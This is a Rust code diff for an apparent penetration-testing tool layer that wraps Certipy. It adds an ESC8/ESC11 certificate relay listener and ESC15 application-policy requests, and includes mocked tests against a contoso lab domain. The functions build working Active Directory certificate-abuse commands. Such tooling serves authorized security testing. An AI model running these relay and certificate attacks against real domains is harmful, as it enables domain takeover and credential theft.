@@ -56,6 +56,7 @@ pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
     let target = optional_str(args, "target")
         .or_else(|| optional_str(args, "ca_host"))
         .or_else(|| optional_str(args, "target_ip"));
+    let application_policies = optional_str(args, "application_policies");
 
     // Generate a unique output filename to avoid certipy's interactive overwrite
     // prompt which kills non-interactive runs. Use template + epoch millis.
@@ -83,6 +84,7 @@ pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
         .flag_opt("-target", target)
         .flag_opt("-upn", upn)
         .flag_opt("-sid", sid)
+        .flag_opt("-application-policies", application_policies)
         .timeout_secs(120)
         .execute()
         .await
@@ -427,6 +429,28 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
         exit_code: if auth_success { Some(0) } else { Some(1) },
         success: auth_success,
     })
+}
+
+/// Start a Certipy relay listener for ESC8 (HTTP) or ESC11 (RPC) attacks.
+///
+/// Required args: `target`, `ca`
+/// Optional args: `template`
+///
+/// For ESC8:  `certipy relay -target http://ca-host -ca CA-NAME`
+/// For ESC11: `certipy relay -target rpc://ca-host -ca CA-NAME`
+pub async fn certipy_relay(args: &Value) -> Result<ToolOutput> {
+    let target = required_str(args, "target")?;
+    let ca = required_str(args, "ca")?;
+    let template = optional_str(args, "template");
+
+    CommandBuilder::new("certipy")
+        .arg("relay")
+        .flag("-target", target)
+        .flag("-ca", ca)
+        .flag_opt("-template", template)
+        .timeout_secs(300)
+        .execute()
+        .await
 }
 
 /// Modify a certificate template for ESC4 exploitation using Certipy.
@@ -837,6 +861,27 @@ mod tests {
             "password": "P@ss", "template": "ESC4", "dc_ip": "192.168.58.1"
         });
         assert!(super::certipy_template_esc4(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn certipy_relay_executes() {
+        mock::push(mock::success());
+        let args = json!({
+            "target": "rpc://192.168.58.10", "ca": "contoso-CA"
+        });
+        assert!(super::certipy_relay(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn certipy_request_with_application_policies_executes() {
+        mock::push(mock::success());
+        let args = json!({
+            "username": "admin", "domain": "contoso.local",
+            "password": "P@ss", "ca": "contoso-CA", "template": "ESC15",
+            "dc_ip": "192.168.58.1",
+            "application_policies": "1.3.6.1.5.5.7.3.2"
+        });
+        assert!(super::certipy_request(&args).await.is_ok());
     }
 
     #[tokio::test]
